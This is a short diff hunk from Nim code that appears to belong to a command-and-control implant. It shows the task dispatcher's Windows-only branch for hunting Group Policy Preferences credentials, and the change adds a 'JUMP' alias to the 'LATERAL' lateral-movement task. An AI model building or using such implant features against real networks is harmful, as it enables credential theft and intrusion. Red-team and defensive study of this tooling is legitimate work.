@@ -2121,7 +2121,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     when defined(windows): t.sendResult(id, doGppHunt(), "")
     else: t.sendResult(id, "", "GPP_HUNT: not supported on Linux")
 
-  of "LATERAL":
+  of "LATERAL", "JUMP":
     when defined(windows):
       try:
         let j = parseJson(args)
